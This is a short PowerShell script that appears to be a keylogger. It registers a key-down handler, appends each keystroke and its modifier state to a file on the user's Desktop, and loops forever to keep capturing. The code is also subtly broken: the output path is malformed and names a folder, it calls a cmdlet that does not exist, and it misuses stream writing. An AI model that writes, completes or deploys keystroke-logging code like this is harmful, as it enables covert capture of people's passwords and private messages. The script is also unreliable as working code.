# Define the path and filename for the output file
$outputFile = "%USERPROFILE\Desktop"

# Start listening for key events
Add-Type -AssemblyName System.Windows.Forms
$global:keyState = [Windows.Forms.Control]::ModifierKeys

# Define the function to handle key events
Function OnKeyEvent($event) {
    # Open the output file in append mode
    $stream = [System.IO.File]::Open($outputFile, "Append", "Write")

    # Write the key event to the output file
    $stream.Write("{0},{1}`r`n" -f $event.KeyData, $global:keyState)

    # Close the output file
    $stream.Close()
}

# Register the key event handler
$handler = [Windows.Forms.KeyEventHandler]::new({OnKeyEvent($_)})
Add-EventSubscriber -InputObject ([Windows.Forms.Control]::FromHandle((Get-Process -id $pid).MainWindowHandle)) `
    -EventName KeyDown -SourceIdentifier KeyListener -Action $handler

# Wait for input
while ($true) {
    Start-Sleep -Seconds 1
}